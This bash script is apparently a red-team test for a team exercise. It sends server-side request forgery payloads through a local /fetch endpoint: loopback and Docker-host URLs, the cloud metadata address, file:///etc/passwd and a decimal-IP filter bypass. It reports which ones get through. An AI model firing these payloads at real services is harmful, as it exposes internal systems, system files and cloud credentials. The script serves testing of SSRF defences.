#!/usr/bin/env bash
# Red team: SSRF via /fetch — try to reach internal metadata / local services
# exit 0 = SSRF succeeded (RED WINS)
# exit 1 = all SSRF attempts blocked (BLUE WINS)
set -u
TARGET_HOST="${TARGET_HOST:-127.0.0.1}"
TARGET_PORT="${TARGET_PORT:-18080}"
BASE="http://${TARGET_HOST}:${TARGET_PORT}/fetch"
SUCCESS=1

urls=(
  # hit the app itself (loopback SSRF)
  "http://127.0.0.1:8080/healthz"
  "http://localhost:8080/healthz"
  # cloud metadata (AWS/GCP/Azure patterns)
  "http://169.254.169.254/latest/meta-data/"
  # file:// protocol
  "file:///etc/passwd"
  # internal docker host
  "http://host.docker.internal:8080/healthz"
  # decimal IP bypass
  "http://2130706433:8080/healthz"
)

echo "---raw---"
for i in "${!urls[@]}"; do
  u="${urls[$i]}"
  resp=$(curl -sS --max-time 4 "${BASE}?url=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$u'))" 2>/dev/null || echo "$u")" 2>&1) || true
  if echo "$resp" | grep -qE '"status":\s*"ok"|"status":\s*200|root:x:|meta-data'; then
    echo "URL[$i] SSRF_SUCCESS: ${u:0:80}"
    echo "RESPONSE_SNIPPET: ${resp:0:200}"
    SUCCESS=0
  else
    echo "URL[$i] blocked/failed: ${u:0:80}"
  fi
done
echo "---/raw---"

if [ "$SUCCESS" -eq 0 ]; then
  echo "EVIDENCE: SSRF succeeded — internal resource reachable via /fetch"
  exit 0
fi
echo "EVIDENCE: all SSRF attempts blocked or unreachable"
exit 1
